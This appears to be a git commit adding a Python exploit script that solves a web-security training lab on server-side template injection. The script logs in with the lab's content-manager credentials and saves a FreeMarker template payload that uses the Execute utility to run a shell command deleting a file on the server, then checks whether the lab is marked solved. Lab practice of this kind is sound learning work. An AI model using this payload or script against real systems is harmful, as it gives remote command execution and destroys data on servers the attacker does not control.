c5891c7600734463df8e12d3a0f97d42584c0c88
Kuro-orzz <23020674@vnu.edu.vn>
2026-06-15 13:59:22 +0700

    update SSTI

---
+++ Advanced_topics/Server_side_template_injection/03_Server_side_template_injection_using_documentation/attack.py
@@ -0,0 +1,83 @@
+import requests
+import sys
+import urllib3
+from bs4 import BeautifulSoup
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore
+
+# Burp Suite proxy
+proxies = {
+    'http': 'http://127.0.0.1:8080',
+    'https': 'http://127.0.0.1:8080',  
+}
+
+headers = {
+    'Content-Type': 'application/x-www-form-urlencoded',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
+}
+
+
+def get_csrf_token(s, url, path):
+    target_url = url + path
+    r = s.get(target_url, headers=headers)
+    soup = BeautifulSoup(r.text, 'html.parser')
+    csrf = soup.find("input", {'name': 'csrf'})['value'] # type: ignore
+    return csrf
+
+def login_acc(s, url, path, csrf_path, username, password):
+    login_url = url + path
+    payload = {
+        "csrf": get_csrf_token(s, url, csrf_path),
+        "username": username,
+        "password": password
+    }
+    r = s.post(login_url, data=payload, headers=headers, allow_redirects=False)
+    if r.status_code == 302:
+        print(f'[+] Successful login {username} account')
+    else:
+        print(f'[-] Fail to login {username} account')
+        sys.exit(-1)
+
+def edit_template(s, url, path, csrf_path, template):
+    target_url = url + path
+    payload = {
+        'csrf': get_csrf_token(s, url, csrf_path),
+        'template': template,
+        'template-action': 'save'
+    }
+    r = s.post(target_url, data=payload, allow_redirects=False)
+
+    if r.status_code == 302:
+        print(f'[+] Successful edit template to:{template}')
+    else:
+        print(f'[-] Fail to edit the template')
+        sys.exit(-1)
+
+def check_solved_lab(s, url):
+    r = s.get(url)
+    if "Congratulations, you solved the lab!" in r.text:
+        print("[+] Successful solved lab")
+        sys.exit(0)
+
+def main():
+    if len(sys.argv) != 2:
+        print("(+) Usage: %s <url>" % sys.argv[0])
+        print("(+) Example: %s www.example.com" % sys.argv[0])
+        sys.exit(-1)
+
+    s = requests.Session()
+    url = sys.argv[1][:-1] if sys.argv[1][-1] == '/' else sys.argv[1]
+
+    username = 'content-manager'
+    password = 'C0nt3ntM4n4g3r'
+    payload = """
+<#assign ex="freemarker.template.utility.Execute"?new()>
+${ ex("rm /home/carlos/morale.txt") }
+    """
+
+    login_acc(s, url, '/login', '/login', username, password)
+    edit_template(s, url, '/product/template?productId=1', '/product/template?productId=1', payload)
+    check_solved_lab(s, url)
+
+if __name__ == '__main__':
+    main()
